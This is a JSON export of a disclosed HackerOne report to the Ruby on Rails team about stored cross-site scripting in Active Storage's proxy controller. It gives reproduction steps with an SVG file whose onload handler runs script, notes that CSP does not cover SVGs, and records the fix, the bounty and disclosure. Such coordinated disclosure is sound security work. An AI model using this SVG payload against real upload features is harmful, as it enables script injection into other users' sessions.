{"id":949513,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NDk1MTM=","url":"https://hackerone.com/reports/949513","title":"XSS by file (Active Storage `Proxying`)","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-08-02T05:13:31.181Z","submitted_at":"2020-08-02T05:13:31.245Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ooooooo_q","url":"/ooooooo_q","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":22,"url":"https://hackerone.com/rails","handle":"rails","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Ruby on Rails","twitter_handle":null,"website":"http://rubyonrails.org/security","about":"Web development that doesn't hurt."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-09-01T22:51:37.236Z","bug_reporter_agreed_on_going_public_at":"2020-09-01T22:51:37.182Z","team_member_agreed_on_going_public_at":"2020-09-01T19:14:06.796Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello,\nI've seen similar issues with #407319 and #429868 occur with Active Storage's new File serving strategies `Proxying`.\n\nCommit is https://github.com/rails/rails/commit/dfb5a82b259e134eac89784ac4ace0c44d1b4aee.\n\n```ruby\n# https://github.com/rails/rails/blob/master/activestorage/app/controllers/concerns/active_storage/set_headers.rb#L9\n      response.headers[\"Content-Disposition\"] = ActionDispatch::Http::ContentDisposition.format \\\n        disposition: params[:disposition] || \"inline\", filename: blob.filename.\n```\n\n```ruby\n# https://github.com/rails/rails/blob/master/activestorage/app/controllers/active_storage/blobs/proxy_controller.rb\n\n# Proxy files through application. This avoids having a redirect and makes files easier to cache.\nclass ActiveStorage::Blobs::ProxyController \u003c ActiveStorage::BaseController\n  include ActiveStorage::SetBlob\n  include ActiveStorage::SetHeaders\n\n  def show\n    http_cache_forever public: true do\n      set_content_headers_from @blob\n      stream @blob\n    end\n  end\nend  \n```\n\nSince `inline` can be set regardless of the file type, XSS is possible when a malicious file is uploaded.\n\n### Proof of concept\n\n#### 1. Preparing the server\n\n```\n$ rails new proxy_xss --skip-bundle --skip-webpack-install\n$ cd proxy_xss/\n```\n\nEdit Gemfile.\n\n```ruby\nsource 'https://rubygems.org'\ngit_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\n\nruby '2.7.1'\n\ngem 'rails', github: \"rails/rails\", branch: \"master\"\ngem 'sqlite3', '~\u003e 1.4'\ngem 'puma', '~\u003e 4.1'\n\ngem 'bootsnap', '\u003e= 1.4.2', require: false\n\ngroup :development do\n  gem 'listen', '~\u003e 3.2'\nend\n```\n\n```\n$ bundle install\n...\n\n$ head Gemfile.lock\nGIT\n  remote: https://github.com/rails/rails.git\n  revision: 11f54e12b992f6c8d29fd9bedd89ac438a928a2f\n  branch: master\n  specs:\n    actioncable (6.1.0.alpha)\n      actionpack (= 6.1.0.alpha)\n      activesupport (= 6.1.0.alpha)\n      nio4r (~\u003e 2.0)\n      websocket-driver (\u003e= 0.6.1)\n```\n\n```\n$ bundle exec rails active_storage:install\n$ bundle exec rails g resource user name:text\n$ bundle exec rails db:migrate\n```\n\nEdit app files.\n\n```ruby\n# controllers/users_controller.rb\nclass UsersController \u003c ApplicationController\n\n  def new\n    @user = User.new\n  end\n\n  def create\n    user = User.create!(user_params)\n    redirect_to \"/users/#{user.id}\"\n  end\n\n  def show\n    @user = User.find(params[:id])\n  end\n\n  private\n    def user_params\n      params.require(:user).permit(:name, :image)\n    end\nend\n```\n\n```ruby\n# models/user.rb\nclass User \u003c ApplicationRecord\n  has_one_attached :image\nend\n```\n\n```erb\n# views/layouts/application.html.erb\n\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n  \u003chead\u003e\n    \u003ctitle\u003eProxyXss\u003c/title\u003e\n    \u003c%= csrf_meta_tags %\u003e\n    \u003c%= csp_meta_tag %\u003e\n  \u003c/head\u003e\n\n  \u003cbody\u003e\n    \u003c%= yield %\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\n\n```erb\n# views/user/new.html.erb\n\u003c%= form_with model: @user, local: true, :url =\u003e {:action =\u003e :create}  do |form| %\u003e\n  \u003c%= form.text_area :name %\u003e\u003cbr\u003e\n  \u003c%= form.file_field :image %\u003e\u003cbr\u003e\n  \u003c%= form.submit %\u003e\n\u003c% end %\u003e\n```\n\n```erb\n# views/user/show.html.erb\n\u003c% if @user.image.attached? %\u003e\n  \u003c%= image_tag @user.image %\u003e\n\u003c% end %\u003e\n```\n\n#### 2. Obtain url\n\nStart server.\n\n```\nrails s\n```\n\nOpen `http://localhost:3000/users/new` in your browser, Upload the following file as `alert.svg`.\n\n```xml\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n\u003csvg xmlns='http://www.w3.org/2000/svg' width=\"200px\" height=\"200px\" onload=\"javascript:alert(location)\"\u003e\n\u003c/svg\u003e\n```\n\nAfter that, use the developer tool to obtain the redirected URL.\n\n```\nhttp://localhost:3000/rails/active_storage/blobs/redirect/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBCZz09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--ed4ee8109834f4dd747bfb68d7a7ddc2e43e8f69/alert.svg\n```\n\n#### 3. XSS\n\nRewrite `redirect` in URL to `proxy` and alert will appear when opening URL directly in browser.\n\n```\nhttp://localhost:3000/rails/active_storage/blobs/proxy/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBCZz09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--ed4ee8109834f4dd747bfb68d7a7ddc2e43e8f69/alert.svg\n```\n\n{F933309}\n\n## Impact\n\nXSS is possible if attacker can upload files using Active storage.\nThis commit has not been released yet, so it only affects services using Rails on the master branch.\n(Maybe `Hey` etc. https://gist.github.com/dhh/782fb925b57450da28c1e15656779556#file-gemfile-L3)\n\nIn addition, since the csp header is not output for the svg file (https://github.com/rails/rails/blob/master/actionpack/lib/action_dispatch/http/content_security_policy.rb#L20), it can be avoided even if csp is set.","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":933309,"file_name":"__________2020-08-02_13.56.07.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/y8cVzeAnppMhG3nekekqk4WM?response-content-disposition=attachment%3B%20filename%3D%22__________2020-08-02_13.56.07.png%22%3B%20filename%2A%3DUTF-8%27%27__________2020-08-02_13.56.07.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXEQ3VCGF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T154423Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCNbr25hK1JC2i73IX5uE08m1agZwA%2BCyxTPtXmxpZHFAIgA9v21iU9rOtKWjxfMHo7kqQOL4Y8ABbAnucRVLpaC9cqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDOyim%2FBwzSkIWBPCWirXA1TUfPlTIAz6iDfoaiiMP8hivTDD8uDyRJ%2FoAF5UW%2F6cSrWHj2Mtt%2Fx8tKTYSGoQiyhUdi%2BFdxLY35ZRGqE5k10GcpBa5q9ivBUHzTLtIbzvkVLjo0GDs33RjPyv8lT8%2BIT3cR1GpHz5sKugzk1wJHpaXHIGV7TsNZTez5PsxRWLAbodD46%2Bv0aY9dXICvo8Bld1OIiDoUsI3sX2R7SAEjL0B45opfmY7Hh4KKVF9KyCf7etmcGEL0U%2Bjij5TfmuHRxoVJXFKR4WbBKoHXN3cL5AQhAkGBE5bmE6cTsvfhMkCltMfmR1OmQtt1QK7fs2YWSyJhNNnjgzseVzroJk8qcktNvGQQNtmAz%2F0hi%2BbLDdR3r35MBTZtRPxGxwfYKfk%2Blyikhar%2F%2FfPxr6sJoQhbcKSjiziR8cFwFPC97f3qfgH6sVJVvH5AClhLDj9FMqequ01uI1FMQI%2BQ1BJ1t%2Bl3dX7D09OZCMRrk3HvidiN7al4fmx5e0pKMz7tbb23gSzvgiMJbXeHgATiARA8dz6JIoLosFubesB7ZLWq9owsMVaP42CuihB%2Br9J9vu1HkgY4lcWvgRt8bqCjXjWDPBzlNcnc9D32bMJUDfp2BWdJ0BCnpEi4XjrDCyiJGLBjqlAbw%2BQzzkBo5pgpwg2B9K3Kb9khz80zQhxWTR4UFlyZpApeXe135MxtRrVWf1VeEC8qBZynSiicNEE5qSEPmd%2FKNSihzfYJ9PmbUkfZN9yFsrIArapjiCpWMywbnOVNeLSHMFFv8xtfh0sOTI4VetTtHS5BxyHny%2BvnXM6Hjudg5tfOAvbwkv9j%2BTfq0Y0YGFWvyUNrCeX3Y3zQ5t8ked%2FqOvxUSYeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=c03b189c6f789783a852f8cd5c248efa07ae405c87e0e493bc92716f37c07c40","file_size":579944,"type":"image/png"}],"allow_singular_disclosure_at":"2020-10-01T19:14:06.906Z","allow_singular_disclosure_after":-32387417.070997834,"singular_disclosure_allowed":true,"vote_count":3,"voters":["ali","prinzhorn","tvmbug"],"severity":{"rating":"medium","author_type":"User"},"structured_scope":{"databaseId":160,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/rails/rails","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":8847959,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @ooooooo_q,\n\nThanks for the report! We're still looking into this one and will let you know as soon as we have an update.","automated_response":false,"created_at":"2020-08-04T19:27:14.390Z","updated_at":"2020-08-04T19:27:14.390Z","actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9061080,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2020-08-27T22:03:00.585Z","updated_at":"2020-08-27T22:03:00.585Z","actor":{"username":"georgeclaghorn","cleared":false,"url":"/georgeclaghorn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9089447,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @ooooooo_q,\n\nSorry for the delay. I think [b221a4d](https://github.com/rails/rails/commit/b221a4dc43368a1b6f00476f7c5f6047c5c7eea4) in master addresses this. Mind confirming?","automated_response":false,"created_at":"2020-08-31T15:33:06.397Z","updated_at":"2020-08-31T15:33:06.397Z","actor":{"username":"georgeclaghorn","cleared":false,"url":"/georgeclaghorn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9092327,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @georgeclaghorn,\n\nI confirmed that commit. it seems there is no problem.","automated_response":false,"created_at":"2020-08-31T20:02:20.067Z","updated_at":"2020-08-31T20:02:20.067Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9092365,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you!","automated_response":false,"created_at":"2020-08-31T20:11:02.634Z","updated_at":"2020-08-31T20:11:02.634Z","actor":{"username":"georgeclaghorn","cleared":false,"url":"/georgeclaghorn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"ooooooo_q","url":"/ooooooo_q"},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9103437,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2020-09-01T19:13:20.823Z","updated_at":"2020-09-01T19:13:20.823Z","actor":{"url":"/rails","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Ruby on Rails"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"rails","collaborator":{"username":"ooooooo_q","url":"/ooooooo_q"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9103447,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-09-01T19:14:06.826Z","updated_at":"2020-09-01T19:14:06.826Z","first_to_agree":true,"actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9104549,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-09-01T22:51:37.209Z","updated_at":"2020-09-01T22:51:37.209Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9104550,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-09-01T22:51:37.261Z","updated_at":"2020-09-01T22:51:37.261Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}